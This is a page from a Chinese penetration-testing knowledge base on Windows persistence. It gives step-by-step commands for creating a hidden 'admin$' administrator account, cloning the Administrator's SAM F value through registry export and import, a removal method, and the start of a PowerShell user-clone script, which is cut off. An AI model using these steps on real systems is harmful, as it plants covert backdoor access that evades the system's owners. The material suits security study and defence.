<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/权限维持/Windows权限维持" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Windows权限维持 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/权限维持/Windows权限维持"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows权限维持 | d4m1ts 知识库"><meta data-rh="true" name="description" content="影子账号"><meta data-rh="true" property="og:description" content="影子账号"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/权限维持/Windows权限维持"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/权限维持/Windows权限维持" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/权限维持/Windows权限维持" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"权限维持","item":"https://blog.gm7.org/docs/渗透测试/权限维持/"},{"@type":"ListItem","position":3,"name":"Windows权限维持","item":"https://blog.gm7.org/docs/渗透测试/权限维持/Windows权限维持"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.4c121756.js" defer="defer"></script>
<script src="/assets/js/main.5f81c564.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="展开侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="折叠侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/Windows权限提升">Windows权限提升</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/Linux权限提升">Linux权限提升</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/权限维持/Windows权限维持">Windows权限维持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/Linux权限维持">Linux权限维持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/扩展">扩展</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/权限维持/"><span>权限维持</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Windows权限维持</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows权限维持</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="影子账号">影子账号<a href="#影子账号" class="hash-link" aria-label="影子账号的直接链接" title="影子账号的直接链接">​</a></h2>
<p>影子用户即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-对注册表赋予权限">1、 对注册表赋予权限<a href="#1-对注册表赋予权限" class="hash-link" aria-label="1、 对注册表赋予权限的直接链接" title="1、 对注册表赋予权限的直接链接">​</a></h3>
<p>默认注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\</code> 只有system权限才能修改</p>
<p>现在需要为其添加管理员权限</p>
<p>右键-权限-选中Administrators，允许完全控制</p>
<p><img decoding="async" loading="lazy" alt="image-20210706205602898" src="/assets/images/image-20210706205602898-560f2edf10ffd5b01c68058d7aed04fd.png" width="532" height="750" class="img_ev3q"></p>
<p>重启注册表</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2创建特殊账户">2、创建特殊账户<a href="#2创建特殊账户" class="hash-link" aria-label="2、创建特殊账户的直接链接" title="2、创建特殊账户的直接链接">​</a></h3>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">net user admin$ Aa123456</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net localgroup administrators admin$ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">add</span><br></span></code></pre></div></div>
<blockquote>
<p>PS: 用 <strong>$</strong> 结尾是因为 <code>net user</code> 无法获取，一定情况下隐蔽</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3导出注册表">3、导出注册表<a href="#3导出注册表" class="hash-link" aria-label="3、导出注册表的直接链接" title="3、导出注册表的直接链接">​</a></h3>
<p>在注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户 <code>admin$</code></p>
<p>还有如图的 2 个，均导出</p>
<p><img decoding="async" loading="lazy" alt="image-20210706205538607" src="/assets/images/image-20210706205538607-a73c434fb7198ffd2c6ec4b6a1e9dbac.png" width="587" height="575" class="img_ev3q"></p>
<p>得到3个导出的注册表，如下</p>
<p><img decoding="async" loading="lazy" alt="image-20210706205754396" src="/assets/images/image-20210706205754396-0dc01bd9a6717dd27531948bde1a0ac7.png" width="97" height="321" class="img_ev3q"></p>
<p>编辑 <code>1F4</code> 和 <code>3EE</code> 的注册表，用 <code>1F4</code> 里面的 <strong>F</strong> 去替换 <code>3EE</code> 里面的 <strong>F</strong></p>
<p><img decoding="async" loading="lazy" alt="image-20210706205811834" src="/assets/images/image-20210706205811834-f0504b4a49be54705788d04235ffd4ca.png" width="999" height="390" class="img_ev3q"></p>
<p>保存</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4删除特殊账户">4、删除特殊账户<a href="#4删除特殊账户" class="hash-link" aria-label="4、删除特殊账户的直接链接" title="4、删除特殊账户的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">net user admin$ /del</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5导入reg文件">5、导入reg文件<a href="#5导入reg文件" class="hash-link" aria-label="5、导入reg文件的直接链接" title="5、导入reg文件的直接链接">​</a></h3>
<ul>
<li>
<p>方法一：直接双击 <code>admin$</code> 和 <code>3EE</code> 注册表</p>
</li>
<li>
<p>方法二：</p>
</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">regedit /s 3EE.reg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">regedit /s admin$.reg</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210706205840902" src="/assets/images/image-20210706205840902-c79c8fb50ffb139063146a9f99f1cf6d.png" width="434" height="94" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6大功告成">6、大功告成<a href="#6大功告成" class="hash-link" aria-label="6、大功告成的直接链接" title="6、大功告成的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="image-20210706205902258" src="/assets/images/image-20210706205902258-576580e3a3e04b478bd5c7705c1e717e.png" width="427" height="433" class="img_ev3q"></p>
<p>无法通过 <code>net user admin$ /del</code> 来删除</p>
<p><img decoding="async" loading="lazy" alt="image-20210706205925444" src="/assets/images/image-20210706205925444-e7a5a9ccc61832a5c53c759f9c7734d1.png" width="448" height="88" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="7删除方法">7、删除方法<a href="#7删除方法" class="hash-link" aria-label="7、删除方法的直接链接" title="7、删除方法的直接链接">​</a></h3>
<p>删除注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code> 下对应帐户的键值即可(共有两处)</p>
<p><img decoding="async" loading="lazy" alt="image-20210706205944131" src="/assets/images/image-20210706205944131-5444943494fe30b74dca95ae4cdce6cd.png" width="452" height="594" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="8脚本自动化">8、脚本自动化<a href="#8脚本自动化" class="hash-link" aria-label="8、脚本自动化的直接链接" title="8、脚本自动化的直接链接">​</a></h3>
<blockquote>
<p><a href="https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1</a></p>
</blockquote>
<blockquote>
<p>PS C:&gt;.\Windows-User-Clone_ps1.ps1</p>
<p><code>powershell -File Windows-User-Clone_ps1.ps1</code></p>
</blockquote>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> Create-Clone</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">&lt;#</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">.SYNOPSIS</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">This script requires System privileges. You can use Invoke-TokenManipulation.ps1 to get System privileges and create the clone user.</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"></span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">Author: Evilcg and 3gstuent</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">Evilcg&#x27;s way to achieve the same goal:</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"></span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">.PARAMETER u</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">The clone username</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">.PARAMETER p</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">The clone user&#x27;s password</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">.PARAMETER cu</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">The user to be cloned, default administrator </span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">.EXAMPLE</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">Create-Clone -u abc -p abc123 -cu administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token keyword" style="color:#00009f">Param</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">[Parameter(Mandatory=$true)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">[String]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$u</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">[Parameter(Mandatory=$true)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">[String]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">[Parameter(Mandatory=$false)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">[String]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$cu</span><span class="token plain"> = </span><span class="token string" 